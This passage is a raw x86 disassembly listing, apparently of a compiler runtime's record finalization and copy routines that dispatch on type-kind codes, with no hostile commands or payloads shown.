  4041ca:	e8 45 ff ff ff       	call   0x404114
  4041cf:	4f                   	dec    %edi
  4041d0:	7f f0                	jg     0x4041c2
  4041d2:	5d                   	pop    %ebp
  4041d3:	5f                   	pop    %edi
  4041d4:	5e                   	pop    %esi
  4041d5:	5b                   	pop    %ebx
  4041d6:	c3                   	ret
  4041d7:	90                   	nop
  4041d8:	31 c9                	xor    %ecx,%ecx
  4041da:	53                   	push   %ebx
  4041db:	8a 4a 01             	mov    0x1(%edx),%cl
  4041de:	56                   	push   %esi
  4041df:	57                   	push   %edi
  4041e0:	89 c3                	mov    %eax,%ebx
  4041e2:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  4041e6:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  4041ea:	8b 16                	mov    (%esi),%edx
  4041ec:	8b 46 04             	mov    0x4(%esi),%eax
  4041ef:	01 d8                	add    %ebx,%eax
  4041f1:	8b 12                	mov    (%edx),%edx
  4041f3:	b9 01 00 00 00       	mov    $0x1,%ecx
  4041f8:	e8 27 00 00 00       	call   0x404224
  4041fd:	83 c6 08             	add    $0x8,%esi
  404200:	4f                   	dec    %edi
  404201:	7f e7                	jg     0x4041ea
  404203:	89 d8                	mov    %ebx,%eax
  404205:	5f                   	pop    %edi
  404206:	5e                   	pop    %esi
  404207:	5b                   	pop    %ebx
  404208:	c3                   	ret
  404209:	8d 40 00             	lea    0x0(%eax),%eax
  40420c:	83 3d 10 b0 41 00 00 	cmpl   $0x0,0x41b010
  404213:	74 07                	je     0x40421c
  404215:	ff 15 10 b0 41 00    	call   *0x41b010
  40421b:	c3                   	ret
  40421c:	b0 10                	mov    $0x10,%al
  40421e:	e8 f1 e3 ff ff       	call   0x402614
  404223:	c3                   	ret
  404224:	83 f9 00             	cmp    $0x0,%ecx
  404227:	0f 84 e0 00 00 00    	je     0x40430d
  40422d:	50                   	push   %eax
  40422e:	53                   	push   %ebx
  40422f:	56                   	push   %esi
  404230:	57                   	push   %edi
  404231:	89 c3                	mov    %eax,%ebx
  404233:	89 d6                	mov    %edx,%esi
  404235:	89 cf                	mov    %ecx,%edi
  404237:	31 d2                	xor    %edx,%edx
  404239:	8a 06                	mov    (%esi),%al
  40423b:	8a 56 01             	mov    0x1(%esi),%dl
  40423e:	3c 0a                	cmp    $0xa,%al
  404240:	74 25                	je     0x404267
  404242:	3c 0b                	cmp    $0xb,%al
  404244:	74 3e                	je     0x404284
  404246:	3c 0c                	cmp    $0xc,%al
  404248:	74 51                	je     0x40429b
  40424a:	3c 0d                	cmp    $0xd,%al
  40424c:	74 5c                	je     0x4042aa
  40424e:	3c 0e                	cmp    $0xe,%al
  404250:	74 76                	je     0x4042c8
  404252:	3c 0f                	cmp    $0xf,%al
  404254:	0f 84 84 00 00 00    	je     0x4042de
  40425a:	3c 11                	cmp    $0x11,%al
  40425c:	0f 84 8b 00 00 00    	je     0x4042ed
  404262:	e9 97 00 00 00       	jmp    0x4042fe
  404267:	83 f9 01             	cmp    $0x1,%ecx
  40426a:	89 d8                	mov    %ebx,%eax
  40426c:	7f 0a                	jg     0x404278
  40426e:	e8 71 f2 ff ff       	call   0x4034e4
  404273:	e9 91 00 00 00       	jmp    0x404309
  404278:	89 ca                	mov    %ecx,%edx
  40427a:	e8 89 f2 ff ff       	call   0x403508
  40427f:	e9 85 00 00 00       	jmp    0x404309
  404284:	83 f9 01             	cmp    $0x1,%ecx
  404287:	89 d8                	mov    %ebx,%eax
  404289:	7f 07                	jg     0x404292
  40428b:	e8 f0 f8 ff ff       	call   0x403b80
  404290:	eb 77                	jmp    0x404309
  404292:	89 ca                	mov    %ecx,%edx
  404294:	e8 ff f8 ff ff       	call   0x403b98
  404299:	eb 6e                	jmp    0x404309
  40429b:	89 d8                	mov    %ebx,%eax
  40429d:	83 c3 10             	add    $0x10,%ebx
  4042a0:	e8 67 ff ff ff       	call   0x40420c
  4042a5:	4f                   	dec    %edi
  4042a6:	7f f3                	jg     0x40429b
  4042a8:	eb 5f                	jmp    0x404309
  4042aa:	55                   	push   %ebp
  4042ab:	89 d5                	mov    %edx,%ebp
  4042ad:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4042b1:	89 d8                	mov    %ebx,%eax
  4042b3:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4042b7:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4042bb:	8b 12                	mov    (%edx),%edx
  4042bd:	e8 62 ff ff ff       	call   0x404224
  4042c2:	4f                   	dec    %edi
  4042c3:	7f e8                	jg     0x4042ad
  4042c5:	5d                   	pop    %ebp
  4042c6:	eb 41                	jmp    0x404309
  4042c8:	55                   	push   %ebp
  4042c9:	89 d5                	mov    %edx,%ebp
  4042cb:	89 d8                	mov    %ebx,%eax
  4042cd:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4042d1:	89 f2                	mov    %esi,%edx
  4042d3:	e8 00 ff ff ff       	call   0x4041d8
  4042d8:	4f                   	dec    %edi
  4042d9:	7f f0                	jg     0x4042cb
  4042db:	5d                   	pop    %ebp
  4042dc:	eb 2b                	jmp    0x404309
  4042de:	89 d8                	mov    %ebx,%eax
  4042e0:	83 c3 04             	add    $0x4,%ebx
  4042e3:	e8 18 06 00 00       	call   0x404900
  4042e8:	4f                   	dec    %edi
  4042e9:	7f f3                	jg     0x4042de
  4042eb:	eb 1c                	jmp    0x404309
  4042ed:	89 d8                	mov    %ebx,%eax
  4042ef:	89 f2                	mov    %esi,%edx
  4042f1:	83 c3 04             	add    $0x4,%ebx
  4042f4:	e8 bb 04 00 00       	call   0x4047b4
  4042f9:	4f                   	dec    %edi
  4042fa:	7f f1                	jg     0x4042ed
  4042fc:	eb 0b                	jmp    0x404309
  4042fe:	5f                   	pop    %edi
  4042ff:	5e                   	pop    %esi
  404300:	5b                   	pop    %ebx
  404301:	58                   	pop    %eax
  404302:	b0 02                	mov    $0x2,%al
  404304:	e9 0b e3 ff ff       	jmp    0x402614
  404309:	5f                   	pop    %edi
  40430a:	5e                   	pop    %esi
  40430b:	5b                   	pop    %ebx
  40430c:	58                   	pop    %eax
  40430d:	c3                   	ret
  40430e:	8b c0                	mov    %eax,%eax
  404310:	83 3d 14 b0 41 00 00 	cmpl   $0x0,0x41b014
  404317:	74 07                	je     0x404320
  404319:	ff 15 14 b0 41 00    	call   *0x41b014
  40431f:	c3                   	ret
  404320:	b0 10                	mov    $0x10,%al
  404322:	e8 ed e2 ff ff       	call   0x402614
  404327:	c3                   	ret
  404328:	53                   	push   %ebx
  404329:	56                   	push   %esi
  40432a:	57                   	push   %edi
  40432b:	55                   	push   %ebp
  40432c:	89 c3                	mov    %eax,%ebx
  40432e:	89 d6                	mov    %edx,%esi
  404330:	31 c0                	xor    %eax,%eax
  404332:	8a 41 01             	mov    0x1(%ecx),%al
  404335:	8d 7c 08 0a          	lea    0xa(%eax,%ecx,1),%edi
  404339:	8b 6f fc             	mov    -0x4(%edi),%ebp
  40433c:	31 c0                	xor    %eax,%eax
  40433e:	8b 4f f8             	mov    -0x8(%edi),%ecx
  404341:	51                   	push   %ecx
  404342:	8b 4f 04             	mov    0x4(%edi),%ecx
  404345:	29 c1                	sub    %eax,%ecx
  404347:	7e 0b                	jle    0x404354
  404349:	89 c2                	mov    %eax,%edx
  40434b:	01 f0                	add    %esi,%eax
  40434d:	01 da                	add    %ebx,%edx
  40434f:	e8 d4 e2 ff ff       	call   0x402628
  404354:	8b 47 04             	mov    0x4(%edi),%eax
  404357:	8b 17                	mov    (%edi),%edx
  404359:	8b 12                	mov    (%edx),%edx
  40435b:	8a 0a                	mov    (%edx),%cl
  40435d:	80 f9 0a             	cmp    $0xa,%cl
  404360:	74 31                	je     0x404393
  404362:	80 f9 0b             	cmp    $0xb,%cl
  404365:	74 3d                	je     0x4043a4
  404367:	80 f9 0c             	cmp    $0xc,%cl
  40436a:	74 49                	je     0x4043b5
  40436c:	80 f9 0d             	cmp    $0xd,%cl
  40436f:	74 55                	je     0x4043c6
  404371:	80 f9 0e             	cmp    $0xe,%cl
  404374:	74 70                	je     0x4043e6
  404376:	80 f9 0f             	cmp    $0xf,%cl
  404379:	0f 84 80 00 00 00    	je     0x4043ff
  40437f:	80 f9 11             	cmp    $0x11,%cl
  404382:	0f 84 88 00 00 00    	je     0x404410
  404388:	b0 02                	mov    $0x2,%al
  40438a:	5d                   	pop    %ebp
  40438b:	5f                   	pop    %edi
  40438c:	5e                   	pop    %esi
  40438d:	5b                   	pop    %ebx
  40438e:	e9 81 e2 ff ff       	jmp    0x402614
  404393:	8b 14 30             	mov    (%eax,%esi,1),%edx
  404396:	01 d8                	add    %ebx,%eax
  404398:	e8 9b f1 ff ff       	call   0x403538
  40439d:	b8 04 00 00 00       	mov    $0x4,%eax
  4043a2:	eb 7d                	jmp    0x404421
  4043a4:	8b 14 30             	mov    (%eax,%esi,1),%edx
  4043a7:	01 d8                	add    %ebx,%eax
  4043a9:	e8 0e f8 ff ff       	call   0x403bbc
  4043ae:	b8 04 00 00 00       	mov    $0x4,%eax
  4043b3:	eb 6c                	jmp    0x404421
  4043b5:	8d 14 30             	lea    (%eax,%esi,1),%edx
  4043b8:	01 d8                	add    %ebx,%eax
  4043ba:	e8 51 ff ff ff       	call   0x404310
  4043bf:	b8 10 00 00 00       	mov    $0x10,%eax
  4043c4:	eb 5b                	jmp    0x404421
  4043c6:	31 c9                	xor    %ecx,%ecx
  4043c8:	8a 4a 01             	mov    0x1(%edx),%cl
  4043cb:	ff 74 11 02          	push   0x2(%ecx,%edx,1)
